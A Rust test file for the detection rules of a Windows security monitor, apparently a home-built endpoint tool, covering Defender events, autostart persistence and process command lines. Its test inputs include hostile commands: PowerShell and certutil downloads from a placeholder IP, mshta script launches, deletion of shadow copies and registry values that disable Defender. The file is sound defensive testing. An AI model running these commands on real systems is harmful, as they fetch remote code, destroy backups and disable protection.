//! Tests des règles de détection, un positif et un négatif par règle (phase 3, PR 3.5 à 3.12 ; noms
//! `<id>_positif` et `<id>_negatif`, docs/detection/regles.md). Un positif prouve que la règle se déclenche sur
//! l'entrée qui la décrit ; un négatif, qu'une entrée voisine et légitime ne la déclenche pas.

// ------------------------------------------------------------ DEF : Microsoft Defender (PR 3.5)
// Journal Microsoft-Windows-Windows Defender/Operational (defender::traduire) et écarts entre deux relevés de l'état
// WMI (defender::ecarts). Aucune de ces règles n'est exercée en VM : Defender y reste intouché (lot 3d).

fn evenement_defender(id: u32, donnees: &[(&str, &str)]) -> String {
    let d: String = donnees.iter().map(|(n, v)| format!("<Data Name='{n}'>{v}</Data>")).collect();
    format!("<Event><System><EventID>{id}</EventID></System><EventData>{d}</EventData></Event>")
}

fn regle_defender(id: u32, donnees: &[(&str, &str)]) -> Option<(String, String)> {
    crate::defender::traduire(&evenement_defender(id, donnees)).map(|a| (a.regle, a.niveau))
}

fn regle_et_niveau(r: &str, n: &str) -> Option<(String, String)> {
    Some((r.to_string(), n.to_string()))
}

#[test]
fn def_001_positif() {
    assert_eq!(regle_defender(1116, &[("Threat Name", "Trojan:Win32/Test"), ("Path", "file:_C:\\x\\a.exe")]), regle_et_niveau("DEF-001", "Critique"));
}

#[test]
fn def_001_negatif() {
    // Une mise à jour des signatures (2000) n'est pas une détection
    assert_eq!(regle_defender(2000, &[("Threat Name", "Trojan:Win32/Test")]), None);
}

#[test]
fn def_002_positif() {
    assert_eq!(regle_defender(1117, &[("Threat Name", "Trojan:Win32/Test"), ("Action Name", "Quarantaine")]), regle_et_niveau("DEF-002", "Info"));
}

#[test]
fn def_002_negatif() {
    // 1118 (échec d'une action) n'est pas suivie : jamais « menace traitée »
    assert_eq!(regle_defender(1118, &[("Threat Name", "Trojan:Win32/Test")]), None);
}

#[test]
fn def_003_positif() {
    assert_eq!(regle_defender(5001, &[]), regle_et_niveau("DEF-003", "Critique"));
}

#[test]
fn def_003_negatif() {
    // 5000 : protection en temps réel ACTIVÉE
    assert_eq!(regle_defender(5000, &[]), None);
}

#[test]
fn def_004_positif() {
    assert_eq!(regle_defender(5010, &[]), regle_et_niveau("DEF-004", "Critique"));
    assert_eq!(regle_defender(5012, &[]), regle_et_niveau("DEF-004", "Critique"));
}

#[test]
fn def_004_negatif() {
    // 5009, 5011 : analyses réactivées
    assert_eq!(regle_defender(5009, &[]), None);
    assert_eq!(regle_defender(5011, &[]), None);
}

#[test]
fn def_005_positif() {
    let v = r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\outil = 0x0";
    assert_eq!(regle_defender(5007, &[("New Value", v)]), regle_et_niveau("DEF-005", "Critique"));
}

#[test]
fn def_005_negatif() {
    // Exclusion RETIRÉE : nouvelle valeur vide, l'ancienne porte le chemin
    let ancienne = r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\outil = 0x0";
    assert_eq!(regle_defender(5007, &[("Old Value", ancienne), ("New Value", "")]), None);
    // Autre réglage modifié (mise à jour des signatures)
    assert_eq!(regle_defender(5007, &[("New Value", r"HKLM\SOFTWARE\Microsoft\Windows Defender\Signature Updates\SignatureUpdateInterval = 0x4")]), None);
}

#[test]
fn def_006_positif() {
    for v in [r"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x1",
              r"HKLM\SOFTWARE\Microsoft\Windows Defender\DisableAntiSpyware = 0x1",
              r"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x4"] {
        assert_eq!(regle_defender(5007, &[("New Value", v)]), regle_et_niveau("DEF-006", "Critique"), "{v}");
    }
}

#[test]
fn def_006_negatif() {
    // Protection RÉTABLIE (valeurs inverses)
    for v in [r"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x0",
              r"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x5"] {
        assert_eq!(regle_defender(5007, &[("New Value", v)]), None, "{v}");
    }
}

#[test]
fn def_007_positif() {
    assert_eq!(regle_defender(1121, &[("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"), ("Path", r"C:\x\a.exe")]), regle_et_niveau("DEF-007", "Alerte"));
    assert_eq!(regle_defender(1122, &[("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"), ("Path", r"C:\x\a.exe")]), regle_et_niveau("DEF-007", "Info"));
}

#[test]
fn def_007_negatif() {
    // 1120 : hors de la plage suivie ; l'audit (1122) n'est jamais une alerte, seul le blocage (1121) l'est
    assert_eq!(regle_defender(1120, &[("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A")]), None);
    assert_ne!(regle_defender(1122, &[("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A")]).map(|(_, n)| n), Some("Alerte".into()));
}

#[test]
fn def_008_positif() {
    assert_eq!(regle_defender(1123, &[("Path", r"C:\Users\u\Documents\a.docx")]), regle_et_niveau("DEF-008", "Alerte"));
    assert_eq!(regle_defender(1124, &[("Path", r"C:\Users\u\Documents\a.docx")]), regle_et_niveau("DEF-008", "Info"));
}

#[test]
fn def_008_negatif() {
    // L'audit (1124) n'est jamais une alerte : seul le blocage (1123) l'est
    assert_ne!(regle_defender(1124, &[("Path", r"C:\Users\u\Documents\a.docx")]).map(|(_, n)| n), Some("Alerte".into()));
}

#[test]
fn def_009_positif() {
    assert_eq!(regle_defender(1125, &[("Path", "exemple.invalid")]), regle_et_niveau("DEF-009", "Alerte"));
    assert_eq!(regle_defender(1126, &[("Path", "exemple.invalid")]), regle_et_niveau("DEF-009", "Info"));
}

#[test]
fn def_009_negatif() {
    // 1127 : hors de la plage suivie
    assert_eq!(regle_defender(1127, &[("Path", "exemple.invalid")]), None);
}

fn etat_defender(temps_reel: bool, falsification: bool, antivirus: bool) -> crate::defender::EtatDefender {
    crate::defender::EtatDefender { disponible: true, temps_reel, protection_falsification: falsification, antivirus, ..Default::default() }
}

fn regles_ecarts(avant: &crate::defender::EtatDefender, apres: &crate::defender::EtatDefender) -> Vec<String> {
    crate::defender::ecarts(avant, apres).into_iter().map(|a| a.regle).collect()
}

#[test]
fn def_010_positif() {
    assert_eq!(regles_ecarts(&etat_defender(true, true, true), &etat_defender(false, true, true)), ["DEF-010"]);
}

#[test]
fn def_010_negatif() {
    // Protection rétablie, ou déjà coupée au relevé précédent (une seule alerte, au moment de la coupure)
    assert!(regles_ecarts(&etat_defender(false, true, true), &etat_defender(true, true, true)).is_empty());
    assert!(regles_ecarts(&etat_defender(false, true, true), &etat_defender(false, true, true)).is_empty());
}

#[test]
fn def_011_positif() {
    assert_eq!(regles_ecarts(&etat_defender(true, true, true), &etat_defender(true, false, true)), ["DEF-011"]);
}

#[test]
fn def_011_negatif() {
    assert!(regles_ecarts(&etat_defender(true, false, true), &etat_defender(true, true, true)).is_empty());
}

#[test]
fn def_012_positif() {
    assert_eq!(regles_ecarts(&etat_defender(true, true, true), &etat_defender(true, true, false)), ["DEF-012"]);
}

#[test]
fn def_012_negatif() {
    // État illisible à l'un des deux relevés (WMI) : aucune conclusion, aucune alerte (la collecte EtatDefender le dit)
    let mut illisible = etat_defender(false, false, false);
    illisible.disponible = false;
    assert!(regles_ecarts(&etat_defender(true, true, true), &illisible).is_empty());
    assert!(regles_ecarts(&illisible, &etat_defender(true, true, true)).is_empty());
}

/// Dossier phase 3, § 7.1 : `defender::traduire` lit le journal de Defender (données écrites par Defender, mais aussi les
/// chemins et noms de menace qu'il recopie) : aucune panique sur un XML altéré
#[test]
fn def_traduire_sans_panique() {
    for id in [1116u32, 1117, 5007, 1121, 1123, 1125] {
        let valide = evenement_defender(id, &[("Threat Name", "Trojan:Win32/Test"), ("Path", "file:_C:\\x\\a.exe"), ("Process Name", "C:\\x\\p.exe"),
            ("New Value", r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\x = 0x0"), ("ID", "D4F940AB-401B-4EFC-AADC-AD5F3C50688A")]);
        crate::tests::torturer_texte(&valide, &mut |x| {
            let _ = crate::defender::traduire(x);
        });
    }
}

// ------------------------------------------------------------ PER : démarrages automatiques (PR 3.6)
// Relevé des démarrages automatiques comparé à la référence (persistance::comparer, décision pure) ; le relevé lui-même
// (registre, services, tâches) n'est pas exécuté ici. En VM : l'alerte de la clé Run de test (lot 3a).

fn entree_demarrage(cle: &str, commande: &str, signataire: &str, remarque: &str) -> crate::commun::EntreeDemarrage {
    crate::commun::EntreeDemarrage {
        cle: cle.into(), categorie: "Run (HKLM)".into(), nom: "Outil".into(), commande: commande.into(), cible: r"C:\Program Files\Outil\outil.exe".into(),
        signataire: signataire.into(), remarque: remarque.into(), ..Default::default()
    }
}

fn reference_demarrage(entrees: &[crate::commun::EntreeDemarrage]) -> std::collections::HashMap<String, crate::commun::EntreeDemarrage> {
    entrees.iter().map(|e| (e.cle.clone(), e.clone())).collect()
}

fn regles_comparer(reference: &[crate::commun::EntreeDemarrage], releve: &[crate::commun::EntreeDemarrage], apprentissage: bool) -> (Vec<(String, String)>, bool) {
    regles_comparer_avec(reference, releve, apprentissage, &mut Default::default())
}

fn regles_comparer_avec(reference: &[crate::commun::EntreeDemarrage], releve: &[crate::commun::EntreeDemarrage], apprentissage: bool,
                        en_attente: &mut std::collections::HashSet<String>) -> (Vec<(String, String)>, bool) {
    let mut r = releve.to_vec();
    let (a, modifie) = crate::persistance::comparer(&reference_demarrage(reference), &mut r, apprentissage, en_attente);
    (a.into_iter().map(|a| (a.regle, a.niveau)).collect(), modifie)
}

#[test]
fn per_001_positif() {
    let connue = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur", "");
    let nouvelle = entree_demarrage("k2", r#"powershell -w hidden -enc AAAA"#, "", "lancé via powershell");
    let (a, modifie) = regles_comparer(&[connue.clone()], &[connue, nouvelle], false);
    assert_eq!(a, [("PER-001".to_string(), "Alerte".to_string())], "entrée inconnue et suspecte : PER-001 au niveau Alerte");
    assert!(modifie);
    // Inconnue mais sans remarque : PER-001 au niveau Info
    let banale = entree_demarrage("k3", r#""C:\Program Files\Autre\autre.exe""#, "Éditeur", "");
    assert_eq!(regles_comparer(&[], &[banale], false).0, [("PER-001".to_string(), "Info".to_string())]);
}

#[test]
fn per_001_negatif() {
    let connue = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur", "");
    // Relevé identique : rien
    assert_eq!(regles_comparer(&[connue.clone()], &[connue.clone()], false), (vec![], false));
    // Entrée nouvelle pendant l'apprentissage (premier relevé) : apprise, pas d'alerte
    let nouvelle = entree_demarrage("k2", "x.exe", "", "NON SIGNÉ");
    let (a, modifie) = regles_comparer(&[connue.clone()], &[connue, nouvelle], true);
    assert!(a.is_empty() && modifie, "apprentissage : référence réécrite, aucune alerte");
}

#[test]
fn per_002_positif() {
    let avant = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur", "");
    let apres = entree_demarrage("k1", r#""C:\Users\Public\outil.exe""#, "", "dossier suspect");
    let (a, modifie) = regles_comparer(&[avant], &[apres], false);
    assert_eq!(a, [("PER-002".to_string(), "Alerte".to_string())]);
    assert!(modifie);
    // Audit de #83, S83-06 : même commande, entrée devenue suspecte (classe COM surchargée après coup dans un profil)
    // Confirmée au relevé suivant (relecture de #83, R3-D1) : rien au premier, l'alerte au second
    let tache = entree_demarrage("t1", "COM {F47D8C53-0B74-4A66-959D-367710AB1F84}", "Microsoft Windows", "");
    let surchargee = entree_demarrage("t1", "COM {F47D8C53-0B74-4A66-959D-367710AB1F84}", "?", "serveur COM non enregistré pour la machine");
    let mut attente = std::collections::HashSet::new();
    assert!(regles_comparer_avec(&[tache], &[surchargee.clone()], false, &mut attente).0.is_empty(), "premier relevé : à confirmer");
    assert_eq!(regles_comparer_avec(&[surchargee.clone()], &[surchargee.clone()], false, &mut attente).0, [("PER-002".to_string(), "Alerte".to_string())]);
    assert!(attente.is_empty());
    assert!(regles_comparer_avec(&[surchargee.clone()], &[surchargee], false, &mut attente).0.is_empty(), "une seule alerte");
}

#[test]
fn per_002_devenu_suspect_passager() {
    // Relecture de #83, R3-D1 : signature passagèrement invérifiable (démarrage du PC) : « NON SIGNÉ » un relevé, propre
    // au suivant ; aucune alerte
    let propre = entree_demarrage("s1", r#"C:\WINDOWS\System32\svchost.exe -k x"#, "Microsoft Windows", "");
    let passagere = entree_demarrage("s1", r#"C:\WINDOWS\System32\svchost.exe -k x"#, "", "NON SIGNÉ");
    let mut attente = std::collections::HashSet::new();
    assert!(regles_comparer_avec(&[propre.clone()], &[passagere.clone()], false, &mut attente).0.is_empty());
    assert!(regles_comparer_avec(&[passagere], &[propre], false, &mut attente).0.is_empty());
    assert!(attente.is_empty(), "plus rien à confirmer");
    // Entrée disparue, ou commande changée, entre les deux relevés : oubliée
    let mut attente: std::collections::HashSet<String> = ["s2".to_string()].into();
    let autre = entree_demarrage("s3", "z.exe", "Éditeur", "");
    regles_comparer_avec(&[autre.clone()], &[autre], false, &mut attente);
    assert!(attente.is_empty());
}

/// Relecture de #83, R4-D1 : un échec de vérification de signature n'est pas gardé comme un résultat : il ne vaut que
/// 30 s, et le relevé suivant (une minute plus tard) le refait ; un résultat signé, lui, est gardé. R5-D1 : une seule
/// clé d'échec par chemin, quel que soit le nombre d'échecs
#[test]
fn per_002_echec_de_signature_non_garde() {
    use crate::moniteur::{echec_recent, signataire_cache_a};
    assert!(echec_recent("7|100", 7, 129, 30));
    assert!(!echec_recent("7|100", 7, 130, 30), "30 s passées");
    assert!(!echec_recent("7|100", 8, 101, 30), "fichier modifié depuis");
    assert!(!echec_recent("7|100", 7, 99, 30), "horloge reculée (R6-D1)");
    assert!(echec_recent("7|100", 7, 90_000, u64::MAX), "cycle de surveillance : gardé tant que le fichier ne change pas");
    assert!(!echec_recent("7|100", 8, 101, u64::MAX));
    assert!(!echec_recent("", 0, 0, 30) && !echec_recent("x|y", 0, 0, 30));
    // Fichier non signé hors de Windows : vérification exécutée, résultat vide rangé sous la clé d'échec seulement
    let d = std::env::temp_dir().join(format!("d4t-sig-{}", std::process::id()));
    std::fs::create_dir_all(&d).unwrap();
    let f = d.join("outil.exe");
    std::fs::write(&f, b"MZ pas un vrai programme").unwrap();
    let chemin = f.to_string_lossy().to_string();
    let mut cache = std::collections::HashMap::new();
    let s = signataire_cache_a(&mut cache, "", &chemin, 1_000, 30);
    let premier = cache.clone();
    // Dans les 30 s : échec repris du cache, sans nouvelle vérification (heure notée inchangée)
    signataire_cache_a(&mut cache, "", &chemin, 1_010, 30);
    assert_eq!(cache, premier);
    // Cycle de surveillance (durée illimitée) : repris bien plus tard, sans nouvelle vérification
    signataire_cache_a(&mut cache, "", &chemin, 80_000, u64::MAX);
    assert_eq!(cache, premier);
    // Échecs dans des tranches éloignées : toujours une seule clé, réécrite
    signataire_cache_a(&mut cache, "", &chemin, 5_000, 30);
    let s3 = signataire_cache_a(&mut cache, "", &chemin, 90_000, 30);
    let _ = std::fs::remove_dir_all(&d);
    assert!(s.is_empty() && s3.is_empty(), "fichier non signé : {s} {s3}");
    assert_eq!(cache.len(), 1, "{:?}", cache);
    let (cle, valeur) = cache.iter().next().unwrap();
    assert_eq!(cle, &format!("{chemin}|échec"), "échec gardé comme un résultat");
    assert!(valeur.ends_with("|90000"), "{valeur}");
}

#[test]
fn per_002_devenu_suspect_negatif() {
    let suspecte = entree_demarrage("t1", "x.exe", "", "NON SIGNÉ");
    // Déjà suspecte au relevé précédent (remarque changée, pas apparue) : une seule alerte, au moment où elle l'est devenue
    assert!(regles_comparer(&[suspecte.clone()], &[entree_demarrage("t1", "x.exe", "", "NON SIGNÉ, dossier suspect")], false).0.is_empty());
    // Redevenue propre : pas d'alerte
    assert!(regles_comparer(&[suspecte], &[entree_demarrage("t1", "x.exe", "Éditeur", "")], false).0.is_empty());
    // Devenue suspecte pendant l'apprentissage : pas d'alerte
    let propre = entree_demarrage("t2", "y.exe", "Éditeur", "");
    assert!(regles_comparer(&[propre], &[entree_demarrage("t2", "y.exe", "", "NON SIGNÉ")], true).0.is_empty());
}

#[test]
fn per_002_negatif() {
    // Même commande, signataire ou remarque changés (mise à jour signée par un autre certificat) : noté, sans alerte
    let avant = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur", "");
    let apres = entree_demarrage("k1", r#""C:\Program Files\Outil\outil.exe""#, "Éditeur 2", "");
    let (a, modifie) = regles_comparer(&[avant.clone()], &[apres], false);
    assert!(a.is_empty() && modifie, "signataire changé : référence réécrite, aucune alerte");
    // Commande changée pendant l'apprentissage : pas d'alerte
    let modifiee = entree_demarrage("k1", "autre.exe", "Éditeur", "");
    assert!(regles_comparer(&[avant], &[modifiee], true).0.is_empty());
}

/// Bruit mesuré (PR 3.6) : tâches « SoftLanding » de Windows dont la classe COM est empaquetée (AppX). Leur serveur est
/// un fichier du dossier du paquet ; le chemin lu dans le registre ne doit jamais en sortir
#[test]
fn per_001_com_empaquete_chemin_borne() {
    use crate::persistance::{chemin_dans_paquet, version_paquet};
    let racine = r"C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy";
    assert_eq!(chemin_dans_paquet(racine, r"SoftLandingTask\SoftLandingTask.exe").as_deref(), Some(r"C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SoftLandingTask\SoftLandingTask.exe"));
    assert_eq!(chemin_dans_paquet(&format!(r"{racine}\"), "a/b.dll").as_deref(), Some(r"C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\a\b.dll"));
    for mauvais in [r"..\..\Users\Public\x.exe", r"a\..\..\x.exe", r"C:\Users\Public\x.exe", r"\\serveur\partage\x.exe", "a.exe:flux", "", "  ",
                    r"...\x.exe", r". .\x.exe", r"a\ .. \x.exe"] {
        assert_eq!(chemin_dans_paquet(racine, mauvais), None, "{mauvais}");
    }
    assert_eq!(chemin_dans_paquet("", "a.exe"), None);
    // Paquets de Windows seulement (audit de #83, S83-03) ; racine sous SystemApps ou WindowsApps, sans remontée
    use crate::persistance::{paquet_de_windows, racine_systeme_de_paquets};
    assert!(paquet_de_windows("MicrosoftWindows.Client.CBS_1000.26100.372.0_x64__cw5n1h2txyewy"));
    assert!(paquet_de_windows("Microsoft.WindowsStore_22410.1401.3.0_x64__8wekyb3d8bbwe"));
    assert!(!paquet_de_windows("Editeur.Outil_1.0.0.0_x64__abcdefghijklm"));
    assert!(!paquet_de_windows("Editeur.Outil_1.0.0.0_x64__cw5n1h2txyewyx"));
    let (w, pf) = (r"C:\WINDOWS", r"C:\Program Files");
    assert!(racine_systeme_de_paquets(r"C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy", w, pf));
    assert!(racine_systeme_de_paquets(r"C:\Program Files\WindowsApps\Microsoft.X_1.0_x64__8wekyb3d8bbwe", w, pf));
    for mauvaise in [r"C:\Users\u\AppData\Local\Packages\X", r"C:\WINDOWS\SystemApps", r"C:\WINDOWS\SystemApps\..\Temp", r"D:\dev\paquet", r"C:\WINDOWS\SystemAppsX\Y", ""] {
        assert!(!racine_systeme_de_paquets(mauvaise, w, pf), "{mauvaise}");
    }
    assert!(!racine_systeme_de_paquets(r"C:\WINDOWS\SystemApps\X", "", ""), "dossiers système inconnus : refus");
    // Classe surchargée dans un profil (HKCU) : jamais résolue (contrôle du source : le registre n'est pas lu ici)
    let p = include_str!("persistance.rs").replace("\r\n", "\n");
    let d = p.find("fn serveur_com_empaquete(").unwrap();
    let f = &p[d..d + p[d..].find("\n}\n").unwrap()];
    assert!(f.find("if surchargee {\n        return None;").unwrap() < f.find(r"PackagedCom\ClassIndex").unwrap(), "classe surchargée dans un profil résolue quand même");
    assert!(f.contains(".filter(|p| paquet_de_windows(p))") && f.contains("if !racine_systeme_de_paquets("), "paquet ou racine non vérifiés");
    // La version la plus récente, comparée nombre par nombre
    assert!(version_paquet("P_1000.26100.372.0_x64__e") > version_paquet("P_1000.26100.360.0_x64__e"));
    assert!(version_paquet("P_1.100.0.0_x64__e") > version_paquet("P_1.99.0.0_x64__e"));
}

/// Bruit mesuré (PR 3.6) : le nettoyage que OneDrive pose dans « RunOnce » (effacer son installeur) n'est plus pris pour
/// un interpréteur suspect ; la moindre variation de la commande l'y remet
#[test]
fn per_001_nettoyage_onedrive() {
    use crate::persistance::nettoyage_onedrive;
    assert!(nettoyage_onedrive(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#));
    assert!(nettoyage_onedrive(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\Jean Dupont\AppData\Local\Microsoft\OneDrive\StandaloneUpdater\OneDriveSetup.exe""#));
    for c in [
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe" & calc.exe"#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\Autre.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u&calc\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /c powershell -enc AAAA"#,
        r#"C:\Users\u\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        // Audit de #83, S83-01 : variable remplacée par cmd avant l'analyse (injection), et autres caractères spéciaux
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\%Z%\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u^&calc\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\!Z!\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
        r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u)(x\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#,
    ] {
        assert!(!nettoyage_onedrive(c), "{c}");
    }
    // Branché dans l'évaluation : la commande exacte n'est plus « lancé via cmd », une variante l'est toujours
    let e = |commande: &str| crate::commun::EntreeDemarrage {
        categorie: "RunOnce (u)".into(), nom: "Delete Cached Update Binary".into(), commande: commande.into(),
        cible: r"C:\WINDOWS\system32\cmd.exe".into(), signataire: "Microsoft Windows".into(), ..Default::default()
    };
    assert!(!crate::persistance::evaluer(&e(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#)).contains("lancé via cmd"));
    assert!(crate::persistance::evaluer(&e(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe" & calc"#)).contains("lancé via cmd"));
    // Exemption réservée à « RunOnce » : la même commande dans « Run » ou une tâche reste suspecte (S83-01)
    let mut run = e(r#"C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\u\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""#);
    run.categorie = "Run (u)".into();
    assert!(crate::persistance::evaluer(&run).contains("lancé via cmd"));
}

// ------------------------------------------------------------ PRC : processus (PR 3.7)
// Décision pure de processus::alerte_processus, sur des processus synthétiques (création de processus de Sysmon 1 ou de
// WMI, avec le parent et la ligne de commande). Aucune de ces règles n'est exercée en VM : voir la fiche.

fn regle_processus(image: &str, ligne: Option<&str>, parent: Option<&str>) -> Option<(String, String)> {
    let p = crate::processus::InfoProcessus::pour_test(image, ligne, parent);
    crate::processus::alerte_processus(1234, &p).map(|a| (a.regle, a.niveau))
}

const WORD: &str = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE";
const POWERSHELL: &str = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
const EXPLORATEUR: &str = r"C:\Windows\explorer.exe";

#[test]
fn prc_001_positif() {
    // Word qui lance PowerShell, même sans ligne de commande suspecte (ou sans ligne : processus déjà terminé)
    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -NoProfile"), Some(WORD)), regle_et_niveau("PRC-001", "Critique"));
    assert_eq!(regle_processus(POWERSHELL, None, Some(WORD)), regle_et_niveau("PRC-001", "Critique"));
    // Avec un motif de téléchargement en plus : la plus forte reste PRC-001
    assert_eq!(regle_processus(POWERSHELL, Some("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')"), Some(WORD)),
               regle_et_niveau("PRC-001", "Critique"));
}

#[test]
fn prc_001_negatif() {
    // PowerShell lancé par l'Explorateur ; Word qui lance un programme qui n'est pas un interpréteur
    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -NoProfile"), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(r"C:\Windows\splwow64.exe", Some("splwow64.exe 8192"), Some(WORD)), None);
}

#[test]
fn prc_002_positif() {
    let encode = format!("powershell.exe -NoP -W Hidden -enc {}", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA");
    assert_eq!(regle_processus(POWERSHELL, Some(&encode), Some(EXPLORATEUR)), regle_et_niveau("PRC-002", "Alerte"));
    assert_eq!(regle_processus(POWERSHELL, Some("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-002", "Alerte"));
}

#[test]
fn prc_002_negatif() {
    // Script d'administration ordinaire ; « -enc » suivi d'un texte court (pas une charge encodée)
    assert_eq!(regle_processus(POWERSHELL, Some(r"powershell.exe -ExecutionPolicy Bypass -File C:\scripts\inventaire.ps1"), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -enc UwB0AGEAcgB0AA=="), Some(EXPLORATEUR)), None);
}

#[test]
fn prc_003_positif() {
    assert_eq!(regle_processus(r"C:\Windows\System32\certutil.exe", Some("certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-003", "Alerte"));
    assert_eq!(regle_processus(r"C:\Windows\System32\mshta.exe", Some("mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\")"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-003", "Alerte"));
}

#[test]
fn prc_003_negatif() {
    // Usages ordinaires des mêmes outils
    assert_eq!(regle_processus(r"C:\Windows\System32\certutil.exe", Some("certutil.exe -store My"), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(r"C:\Windows\System32\rundll32.exe", Some(r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL"), Some(EXPLORATEUR)), None);
}

#[test]
fn prc_004_positif() {
    assert_eq!(regle_processus(r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                               Some(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 --headless"#), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-004", "Alerte"));
}

#[test]
fn prc_004_negatif() {
    // WebView2 (composant d'applications) en débogage ; navigateur lancé normalement
    assert_eq!(regle_processus(r"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\msedgewebview2.exe",
                               Some(r#""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\msedgewebview2.exe" --remote-debugging-port=0"#), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                               Some(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default"#), Some(EXPLORATEUR)), None);
}

#[test]
fn prc_005_positif() {
    assert_eq!(regle_processus(r"C:\Windows\System32\vssadmin.exe", Some("vssadmin.exe delete shadows /all /quiet"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-005", "Critique"));
    assert_eq!(regle_processus(r"C:\Windows\System32\bcdedit.exe", Some("bcdedit /set {default} recoveryenabled No"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-005", "Critique"));
    // Ancien faux négatif (fiche, avant la PR 3.7) : un motif PowerShell plus tôt dans la ligne ne masque plus la suppression
    // des sauvegardes, qui donne la règle et le niveau
    let p = crate::processus::InfoProcessus::pour_test(POWERSHELL,
        Some("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a'); vssadmin delete shadows /all"), Some(EXPLORATEUR));
    let a = crate::processus::alerte_processus(1234, &p).expect("alerte");
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score), ("PRC-005", "Critique", 10));
    assert!(a.raisons.contains("PowerShell obscurci") && a.raisons.contains("suppression des sauvegardes"), "les deux motifs : {}", a.raisons);
}

#[test]
fn prc_005_negatif() {
    // Lecture des clichés, sans suppression
    assert_eq!(regle_processus(r"C:\Windows\System32\vssadmin.exe", Some("vssadmin.exe list shadows"), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(r"C:\Windows\System32\wbadmin.exe", Some("wbadmin get versions"), Some(EXPLORATEUR)), None);
}

// ------------------------------------------------------------ CHA : chaînes de processus (PR 3.7)
// chaines::Arbre sur une liste de processus synthétique : explorer → cmd → powershell → certutil

fn arbre_de_test() -> crate::chaines::Arbre {
    use crate::natif::InfoListe;
    let mut arbre = crate::chaines::Arbre::default();
    let liste: std::collections::HashMap<u32, InfoListe> = [
